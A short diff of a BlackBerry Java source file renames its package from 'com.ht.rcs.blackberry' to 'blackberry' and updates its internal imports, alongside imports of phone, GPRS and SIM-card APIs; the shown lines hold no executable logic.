@@ -6,19 +6,19 @@
  * Created      : 26-mar-2010
  * *************************************************/
 
-package com.ht.rcs.blackberry;
+package blackberry;
 
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.SIMCardException;
 import net.rim.device.api.system.SIMCardInfo;
 
-import com.ht.rcs.blackberry.interfaces.Singleton;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
-import com.ht.rcs.blackberry.utils.WChar;
+import blackberry.interfaces.Singleton;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
+import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
